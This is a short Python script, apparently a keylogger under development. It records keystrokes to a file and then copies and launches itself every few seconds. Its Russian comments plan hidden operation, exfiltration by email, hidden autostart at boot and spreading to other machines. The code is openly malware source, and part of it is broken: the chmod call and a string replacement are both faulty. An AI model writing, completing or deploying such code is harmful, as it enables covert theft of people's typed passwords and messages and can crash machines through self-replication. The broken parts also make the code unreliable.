#!/usr/bin/python3

from pynput import keyboard
from pynput.keyboard import Key, Listener
import os, sys, time, uuid

pressedkeys = []

def on_press(key):
    try:
        pressedkeys.append(key.char)
    except AttributeError:
        pressedkeys.append(f" {key} ")

    writeToFile(pressedkeys)

def writeToFile(pressedkeys):
    with open("log.txt", "w") as file:
        for keybKey in pressedkeys:
            cleankey = str(keybKey).replace("'" and "Key", "")
            file.write(cleankey)

def on_release(key):
    if key == keyboard.Key.esc:
        return False
# скрытая работа, запуск  ok поебись с батниками и тп
# отправка данных куда-то  (через почту)
# автозапуск при загрузке пк(прятать из загрузки) сделать файл скрытым

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

    # DELETE THIS!!!!
for i in range(len(pressedkeys)):
    print(pressedkeys[i])
    # DELETE THIS!!!!


with open(sys.argv[0]) as file:
    self_content = file.read()
    while True:
        # wait 3 seconds
        time.sleep(3)

        # create unique filename
        dupe = "%s.py" % uuid.uuid4()

        # open and write to the copy
        copy = open(dupe, "w")
        copy.write(self_content)
        copy.close()

        # make the copy executable and execute
        os.chmod(dupe, "0777")
        os.system("./%s &" % dupe) #доделать расспространение

if __name__ == '__main__':
    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
    listener.start()